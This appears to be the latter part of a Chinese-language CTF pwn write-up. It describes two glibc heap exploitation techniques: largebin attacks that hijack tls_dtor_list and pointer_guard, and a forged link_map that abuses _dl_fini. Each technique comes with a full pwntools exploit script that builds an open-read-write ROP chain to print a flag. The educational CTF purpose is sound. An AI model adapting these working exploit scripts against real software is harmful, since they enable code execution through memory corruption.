![](https://p3.ssl.qhimg.com/t01cfe6bf9814d6e7c9.png)

###  方法一攻击原理

通过两次`largebin
attack`将已知地址写入结构体指针`tls_dtor_list`和`fs:0x30（tcbhead_t->pointer_guard）`里，然后风水布置堆块，伪造`dtor_list`结构体，接下来就是利用`__call_tls_dtors`函数来调用我们的指针，这里找到了不错的gadget

    
    
    0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    

可以通过`rdi`控制`rdx`，再调用`setcontext+61`进行栈迁移，`orw`读出flag。

###  exp

    
    
    #!/usr/bin/env python3
    #coding=utf-8
    from pwn import*
    import os
    context.log_level = 'debug'
    context.arch='amd64'
    binary = './pwn' 
    main_arena = 2198624
    s = lambda buf: io.send(buf)
    sl = lambda buf: io.sendline(buf)
    sa = lambda delim, buf: io.sendafter(delim, buf)
    sal = lambda delim, buf: io.sendlineafter(delim, buf)
    shell = lambda: io.interactive()
    r = lambda n=None: io.recv(n)
    ra = lambda t=tube.forever:io.recvall(t)
    ru = lambda delim: io.recvuntil(delim)
    rl = lambda: io.recvline()
    rls = lambda n=2**20: io.recvlines(n)
    su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
    #context.terminal = ['tilix', '-x', 'sh', '-c']
    #context.terminal = ['tilix', 'splitw', '-v']
    local = 1
    if local == 1:
        io=process(binary)
    else:
        io=remote()
    elf=ELF(binary)
    #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
    def add(index,size,flag=1):
        pay = b'\x01'
        pay += p8(index)
        pay += p16(size)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    def free(index,flag=1):
        pay = b'\x02'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    def show(index,flag=1):
        pay = b'\x03'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    def edit(index,size,content,flag=1):
        pay = b'\x04'
        pay += p8(index)
        pay += p16(size)
        pay += content
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    
    add(0,0x410)#0
    add(1,0x460)#1
    add(2,0x418)#2
    add(3,0x440)#3
    add(4,0x410)#4
    #---free(1) and show(1)---    pay = free(1,0)
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #-------------------------    #---------leak------------    libc_base = u64(ru(b'\x7f')[-6:].ljust(0x8,b'\x00')) - main_arena - 96
    su('libc_base',libc_base)
    pointer_guard_addr = libc_base - 0x2890
    tls_dtor_list_addr = libc_base - 0x2918
    su('pointer_guard_addr',pointer_guard_addr)
    su('tls_dtor_list_addr',tls_dtor_list_addr)
    set_context = libc_base + libc.sym['setcontext'] + 61
    fh = libc.sym['__free_hook']+libc_base
    #0x000000000005dfd1 : mov rax, rdi ; ret 
    #0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
    ret = libc_base + libc.sym['setcontext'] + 334
    
    syscall = next(libc.search(asm("syscall\nret")))+libc_base
    #---------------------------------------    
    #------largebin attack and leak heap----    pay = free(3,0)
    pay += edit(1,0x20,p64(0)*3+p64(pointer_guard_addr-0x20),0)
    pay += add(5,0x500,0)#5
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    ru('Malloc Done\n')
    heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
    su('heap',heap)
    pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
    pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #---------------------------------------    
    add(1,0x460)#1
    add(3,0x440)#3
    
    #------largebin attack ------------------    free(1)
    pay = free(3,0)
    pay += edit(1,0x20,p64(0)*3+p64(tls_dtor_list_addr-0x20),0)
    pay += add(5,0x500,0)#5
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    ru('Malloc Done\n')
    heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
    su('heap',heap)
    pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
    pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #---------------------------------------    #0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    #--------------------------------------    pay = add(1,0x460,0)#1
    pay+=free(2,0)#0
    pay+=add(2,0x430,0)#1
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #--------------------------------------    
    rop = (0x0000000000169e90+libc_base)^(heap+0x2f50)
    rop = ((rop>>(64-0x11))|(rop<<0x11))
    pay = b''.ljust(0x410,b's')+p64(rop)+p64(heap+0x26d0)
    edit(2,len(pay),pay)
    gdb.attach(io)
    payload = p64(0)+p64(heap+0x26d0)+p64(0)+p64(0)+p64(set_context)
    payload = payload.ljust(0x70,b'\0')+p64(fh&0xfffffffffffff000)#rsi
    payload = payload.ljust(0x68,b'\0')+p64(0)#rdi
    payload = payload.ljust(0x88,b'\0')+p64(0x2000)#rdx
    payload = payload.ljust(0xa0,b'\0')+p64((fh&0xfffffffffffff000)+8)#bytes(frame)
    payload = payload.ljust(0xa0,b'\0')+p64(syscall)#rip
    edit(1,len(payload),payload)#make rdx = chunk3
    add(1,0x550)
    ru(b'ERROR\n')
    pop_rdx_r12_ret = 0x0000000000122431+libc_base
    layout = [next(libc.search(asm('pop rdi\nret')))+libc_base
        ,fh&0xfffffffffffff000
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,0
        ,p64(pop_rdx_r12_ret)
        ,p64(0)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,2
        ,syscall
        ,next(libc.search(asm('pop rdi\nret')))+libc_base
        ,3
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,(fh&0xfffffffffffff000)+0x200
        ,p64(pop_rdx_r12_ret)
        ,p64(0x30)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,0
        ,syscall
        ,next(libc.search(asm('pop rdi\nret')))+libc_base
        ,1
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,(fh&0xfffffffffffff000)+0x200
        ,p64(pop_rdx_r12_ret)
        ,p64(0x30)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,1
        ,syscall]
    shellcode=b'./flag'.ljust(8,b'\x00')+flat(layout)
    gdb.attach(proc.pidof(io)[0])
    
    s(shellcode)
    
    shell()
    

###  方法二攻击原理

利用第二部分的思路来进行攻击：控制`_dl_fini`里的array指针数组并调用它，伪造`link_map`结构体，这里有一个巧妙的地方就是上一个`((fini_t)
array[i])
();`执行完之后会将上一个调用的函数地址保存在`rdx`寄存器里，然后如果我们可以伪造array[i]为`setcontext+61`，在第二次调用`((fini_t)
array[i]) ();`（如果有的话）我们就可以通过`rdx`控制其他寄存器。

    
    
       0x7ffff7fd9f00 <_dl_fini+512>    call   qword ptr [r14]
    
     ► 0x7ffff7fd9f03 <_dl_fini+515>    mov    rdx, r14                      <0x555555557db8>
       0x7ffff7fd9f06 <_dl_fini+518>    sub    r14, 8
       0x7ffff7fd9f0a <_dl_fini+522>    cmp    qword ptr [rbp - 0x38], rdx
       0x7ffff7fd9f0e <_dl_fini+526>    jne    _dl_fini+512                <_dl_fini+512>
    
    
    
       0x7ffff7ddf8fd <setcontext+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
       0x7ffff7ddf904 <setcontext+68>:    mov    rbx,QWORD PTR [rdx+0x80]
       0x7ffff7ddf90b <setcontext+75>:    mov    rbp,QWORD PTR [rdx+0x78]
       0x7ffff7ddf90f <setcontext+79>:    mov    r12,QWORD PTR [rdx+0x48]
       0x7ffff7ddf913 <setcontext+83>:    mov    r13,QWORD PTR [rdx+0x50]
       0x7ffff7ddf917 <setcontext+87>:    mov    r14,QWORD PTR [rdx+0x58]
       0x7ffff7ddf91b <setcontext+91>:    mov    r15,QWORD PTR [rdx+0x60]
       0x7ffff7ddf91f <setcontext+95>:    test   DWORD PTR fs:0x48,0x2
    

###  exp

    
    
    #!/usr/bin/env python3
    #coding=utf-8
    from pwn import*
    import os
    context.log_level = 'debug'
    context.arch='amd64'
    binary = './pwn' 
    main_arena = 2198624
    s = lambda buf: io.send(buf)
    sl = lambda buf: io.sendline(buf)
    sa = lambda delim, buf: io.sendafter(delim, buf)
    sal = lambda delim, buf: io.sendlineafter(delim, buf)
    shell = lambda: io.interactive()
    r = lambda n=None: io.recv(n)
    ra = lambda t=tube.forever:io.recvall(t)
    ru = lambda delim: io.recvuntil(delim)
    rl = lambda: io.recvline()
    rls = lambda n=2**20: io.recvlines(n)
    su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
    #context.terminal = ['tilix', '-x', 'sh', '-c']
    #context.terminal = ['tilix', 'splitw', '-v']
    local = 1
    if local == 1:
        io=process(binary)
    else:
        io=remote()
    elf=ELF(binary)
    #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
    def add(index,size,flag=1):
        pay = b'\x01'
        pay += p8(index)
        pay += p16(size)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    def free(index,flag=1):
        pay = b'\x02'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    def show(index,flag=1):
        pay = b'\x03'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    def edit(index,size,content,flag=1):
        pay = b'\x04'
        pay += p8(index)
        pay += p16(size)
        pay += content
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    
    
    add(0,0x410)#0
    add(1,0x460)#1
    add(2,0x418)#2
    add(3,0x440)#3
    add(4,0x410)#4
    #---free(1) and show(1)---    pay = free(1,0)
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #-------------------------    #---------leak------------    libc_base = u64(ru(b'\x7f')[-6:].ljust(0x8,b'\x00')) - main_arena - 96
    su('libc_base',libc_base)
    _rtld_global = libc_base+0x26F040
    offset = _rtld_global+0x1790
    set_context = libc_base + libc.sym['setcontext'] + 61
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
    ret = libc_base + libc.sym['setcontext'] + 334
    fh = libc.sym['__free_hook'] + libc_base
    syscall = next(libc.search(asm("syscall\nret")))+libc_base
    #-------------------------    
    #------largebin attack and leak heap----    pay = free(3,0)
    pay += edit(1,0x20,p64(0)*3+p64(_rtld_global-0x20),0)
    pay += add(5,0x500,0)#5
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    ru('Malloc Done\n')
    heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
    su('heap',heap)
    pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
    pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #---------------------------------------    
    add(1,0x460)#1
    add(3,0x440)#3
    payload = p64(0) + p64(offset) + p64(0) + p64(heap + 0x2f50)#chunk
    payload += p64(set_context) + p64(ret)
    rdx = len(payload)-8 
    payload = payload.ljust(0x70+rdx,b'\0')+p64(fh&0xfffffffffffff000)#rsi
    payload = payload.ljust(0x68+rdx,b'\0')+p64(0)#rdi
    payload = payload.ljust(0x88+rdx,b'\0')+p64(0x2000)#rdx
    payload = payload.ljust(0xa0+rdx,b'\0')+p64((fh&0xfffffffffffff000)+8)#bytes(frame)
    payload = payload.ljust(0xa0+rdx,b'\0')+p64(syscall)#rip
    payload = payload.ljust(0x100,b'\x00')
    payload += p64(heap + 0x2f50 + 0x10 + 0x110)*0x3#chunk_addr = chunk+0x960
    payload += p64(0x10)
    payload = payload.ljust(0x31C - 0x10,b'\x00')
    payload += p8(0x8) + b'\x00'*4
    edit(3,len(payload),payload)
    payload = b'\0'*0x410+p64(heap+0x2f70)
    edit(2,len(payload),payload)
    pop_rdx_r12_ret = 0x0000000000122431+libc_base
    layout = [next(libc.search(asm('pop rdi\nret')))+libc_base
        ,fh&0xfffffffffffff000
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,0
        ,p64(pop_rdx_r12_ret)
        ,p64(0)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,2
        ,syscall
        ,next(libc.search(asm('pop rdi\nret')))+libc_base
        ,3
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,(fh&0xfffffffffffff000)+0x200
        ,p64(pop_rdx_r12_ret)
        ,p64(0x30)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,0
        ,syscall
        ,next(libc.search(asm('pop rdi\nret')))+libc_base
        ,1
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,(fh&0xfffffffffffff000)+0x200
        ,p64(pop_rdx_r12_ret)
        ,p64(0x30)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,1
        ,syscall]
    shellcode=b'./flag'.ljust(8,b'\x00')+flat(layout)
    #gdb.attach(proc.pidof(io)[0])
    add(1,0x550)
    ru(b'ERROR\n')
    s(shellcode)
    
    shell()
    

## 资料参考：

<https://www.anquanke.com/post/id/222948#h3-6>

<http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **该用户很懒** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/260754](/post/id/260754)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [glibc](/tag/glibc)
  * [代码审计类](/tag/代码审计类)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t01ddc2cf30bbfe6f3c.png) 该用户很懒

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

